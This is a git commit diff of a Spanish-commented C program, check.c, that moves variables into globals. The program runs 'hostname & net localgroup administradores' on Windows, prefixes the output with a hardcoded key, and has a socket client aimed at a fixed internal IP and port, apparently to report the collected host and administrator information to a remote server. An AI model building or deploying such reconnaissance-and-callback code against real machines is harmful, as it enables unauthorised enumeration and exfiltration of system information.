47f08a75ea9522e6b72ea59a16efbebd0b963825
Agustín Salas <agustin.salas@sagalid.cl>
2020-07-01 01:35:59 -0400

    se definen algunas var globales.

--- check.c
+++ check.c
@@ -5,23 +5,14 @@
 
 int ejecuta(char[], FILE *);
 int cliente_socket(char *);
+char comando [] = "hostname & net localgroup administradores";
+char ip_server [] = "192.168.8.102";
+int puerto_server = 4443;
 
 int main(){
     FILE * file_host;
-    FILE * file_netAdm;
-
-    char comando [] = "hostname & net localgroup administradores";
     ejecuta(comando, file_host);
-
-    //char comando_lg []= "net localgroup administradores";
-    //ejecuta(comando_lg, file_netAdm);
-
-
-    //char * test = "password2, test";
-    //int intCliente = cliente_socket(test);
-
     pclose(file_host);
-    pclose(file_netAdm);
     return 0;
 }
 
@@ -40,9 +31,9 @@ int cliente_socket(char * message){
 		printf("No es posible crear el socket: %d" , WSAGetLastError());
 	}
 
-    server.sin_addr.s_addr = inet_addr("192.168.8.102"); //TODO: IP del server
+    server.sin_addr.s_addr = inet_addr(ip_server);
 	server.sin_family = AF_INET;
-	server.sin_port = htons(4443); //TODO: Puerto del server
+	server.sin_port = htons(puerto_server);
 
     if (connect(s, (struct sockaddr *)&server , sizeof(server)) < 0){
 		puts("Error de conexion");
@@ -63,7 +54,7 @@ int cliente_socket(char * message){
 int ejecuta(char comando [], FILE * fp){
     //FILE *fp;
     char output[1024];
-    char temp[1024] = "password2,";//TODO: poner clave del server
+    char temp[1024] = "password2,"; //TODO: Obtener de var amb, u otro medio.
     fp = popen(comando, "r");
 
     if(fp==NULL){ 
